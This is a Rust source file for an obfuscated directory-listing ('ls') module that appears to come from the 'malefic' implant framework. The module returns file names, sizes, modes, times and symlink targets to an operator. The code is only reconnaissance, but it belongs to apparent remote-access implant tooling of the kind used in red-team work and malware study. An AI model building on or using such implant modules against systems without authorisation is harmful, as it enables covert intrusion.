use crate::prelude::*;
use malefic_proto::proto::modulepb::{FileInfo, LsResponse};

pub struct Ls {}

#[async_trait]
#[module_impl("ls")]
impl Module for Ls {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for Ls {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::Request)?;
        let path = check_field!(request.input)?;
        let mut entries = vec![];
        let read_dir = std::fs::read_dir(&path)?;

        for entry in read_dir.flatten() {
            let p = entry.path();
            let metadata = match entry.metadata() {
                Ok(m) => m,
                Err(_) => continue,
            };
            let mode = malefic_sysinfo::filesys::get_file_mode(&metadata);
            let link = if metadata.file_type().is_symlink() {
                std::fs::read_link(&p)
                    .map(|path| path.to_string_lossy().into_owned())
                    .unwrap_or(String::new())
            } else {
                String::new()
            };
            entries.push(FileInfo {
                name: p
                    .file_name()
                    .map(|os_str| os_str.to_string_lossy().to_string())
                    .unwrap_or(String::new()),
                is_dir: metadata.is_dir(),
                size: metadata.len(),
                mode,
                mod_time: metadata
                    .modified()
                    .ok()
                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                    .unwrap_or(std::time::Duration::from_secs(0))
                    .as_secs() as i64,
                link,
            });
        }

        Ok(TaskResult::new_with_body(
            id,
            Body::LsResponse(LsResponse {
                path,
                exists: true,
                files: entries,
            }),
        ))
    }
}
